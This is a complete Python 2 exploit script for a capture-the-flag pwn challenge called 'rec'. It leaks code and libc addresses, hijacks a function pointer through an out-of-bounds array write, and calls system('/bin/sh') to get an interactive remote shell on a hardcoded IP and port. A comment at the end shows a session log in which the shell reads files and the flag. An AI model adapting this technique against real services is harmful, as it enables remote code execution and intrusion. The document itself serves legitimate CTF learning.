#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string
import ctypes
# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret

# --------------------------------------------------------------------------------------------------
def call(addr, arg, shell=0):               # call any function at any address
    s.send('2' + '\n')                      # Polish
    recv_until('Operator:')
    s.send('S' + '\n')                      # Sum operation

    # -------------------------------------------------------------------------
    # Sing operation function pointer: ebp-0x20 (0xffffcb68)
    #   .text:56555D3B     mov     eax, [ebp+funcptr_20]
    #   .text:56555D3E     call    eax
    #
    # Sum operation starts filling from: 0xffffce84
    # Difference is: 0x31c/8 = 0x63 numbers
    # -------------------------------------------------------------------------
    for i in range(0x63):                   # fill with garbage
        recv_until('Operand:')
        s.send('9999' + '\n')

    recv_until('Operand:')                  # write address
    s.send( str(ctypes.c_int32(int(addr)).value) + '\n')

    recv_until('Operand:')                  # write argument
    s.send( str(ctypes.c_int32(int(arg)).value) + '\n')

    recv_until('Operand:')                  # stop
    s.send( '.' + '\n')

    recv_until('>')                         # call sign
    s.send('5' + '\n')
    
    s.send('foo' + '\n')                    # atoi() will return 0 => call!
    
    if shell == 0:
        return recv_until('>')

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('78.46.224.74', 4127))
    #s = socket.create_connection(('localhost', 7777))
    f = s.makefile()                        # associate a file object with socket

    recv_until('>')
    
    # -------------------------------------------------------------------------
    # leak .text and a .stack address using "read note"
    # code address is at get_str_565826C0():
    #       .text:565556FB     mov     [ebp+var_10], eax
    # -------------------------------------------------------------------------
    s.send('1' + '\n')                      # Read note
    r = recv_until('>')

    off   = r.find("Your note: ") + len("Your note: ")
    # stack = struct.unpack("<L", r[off  :off + 4])[0]
    text  = struct.unpack("<L", r[off+4:off + 8])[0]

    print '[+] .text  address:', hex(text)
    # print '[+] .stack address:', hex(stack)

    # -------------------------------------------------------------------------
    # .plt.printf = 0x56558000
    # .got.printf = 0x56557FC8
    # -------------------------------------------------------------------------
    printf     = text + (0x56555500 - 0x565556FB)
    got_printf = text + (0x56557FC8 - 0x565556FB)

    # -------------------------------------------------------------------------
    # leak any address by calling printf()
    # -------------------------------------------------------------------------
    retn = call(printf, got_printf)
    addr = struct.unpack("<L", retn[:4])[0]

    print '[+] .libc.printf at:', hex(addr)

    # -------------------------------------------------------------------------
    # use libc-database to find address of system() and /bin/sh
    #
    # * * * * local machine * * * * * 
    # ispo@nogirl:/opt/libc-database$ ./find printf 0xf7e46590
    #   http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu3_i386.deb 
    #   (id libc6_2.23-0ubuntu3_i386)
    #
    # ispo@nogirl:/opt/libc-database$ ./dump libc6_2.23-0ubuntu3_i386 printf system str_bin_sh
    #   offset_printf = 0x00049590
    #   offset_system = 0x0003ad80
    #   offset_str_bin_sh = 0x15ba3f
    #
    #
    # * * * * * remote * * * * *
    # ispo@nogirl:~/ctf/33c3_16$ ./rec_expl.py 
    #   [+] .text  address: 0x565ef6fb
    #   [+] .libc.printf at: 0xf75db830
    #
    # ispo@nogirl:/opt/libc-database$ ./dump libc6-i386_2.24-3ubuntu1_amd64 printf system str_bin_sh
    #   offset_printf = 0x00049830
    #   offset_system = 0x0003a8b0
    #   offset_str_bin_sh = 0x15cbcf
    # -------------------------------------------------------------------------

    # local
    #offset_printf = 0x00049590
    #offset_system = 0x0003ad80
    #offset_str_bin_sh = 0x15ba3f

    # remote
    offset_printf = 0x00049830
    offset_system = 0x0003a8b0
    offset_str_bin_sh = 0x15cbcf

    system = addr - (offset_printf - offset_system)
    binsh  = addr - (offset_printf - offset_str_bin_sh)
     
    print '[+] .libc.system at:', hex(system)
    print '[+] /bin/sh      at:', hex(binsh)

    call(system, binsh, 1)

    print '[+] opening shell ...'
    t = telnetlib.Telnet()                  # try to get a shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/33c3_16$ ./rec_expl.py 
[+] .text  address: 0x565d36fb
[+] .libc.printf at: 0xf759d830
[+] .libc.system at: 0xf758e8b0
[+] /bin/sh      at: 0xf76b0bcf
[+] opening shell ...
    id
        uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
    ls
        bin
        boot
        challenge
        dev
        etc
        home
        initrd.img
        initrd.img.old
        lib
        lib32
        lib64
        libx32
        lost+found
        media
        mnt
        opt
        proc
        root
        run
        sbin
        srv
        sys
        tmp
        usr
        var
        vmlinuz
        vmlinuz.old
    ls /home
        challenge
    ls /home/challenge
        flag.txt
        run.sh
    cat /home/challenge/flag.txt
        33c3_DummyFlag
    ls challenge -l    
        total 16
        -rw-r--r-- 1 root root      31 Dec 27 18:53 flag
        -rwxr-xr-x 1 root nogroup 9564 Dec 27 19:18 rec
    cat challenge/flag
        33C3_L0rd_Nikon_would_l3t_u_1n
    exit
    0 - Take note
    1 - Read note
    2 - Polish
    3 - Infix
    4 - Reverse Polish
    5 - Sign
    6 - Exit
    > ^CTraceback (most recent call last):
      File "./rec_expl.py", line 115, in <module>
        t.interact()
      File "/usr/lib/python2.7/telnetlib.py", line 591, in interact
        rfd, wfd, xfd = select.select([self, sys.stdin], [], [])
    KeyboardInterrupt
'''
# --------------------------------------------------------------------------------------------------
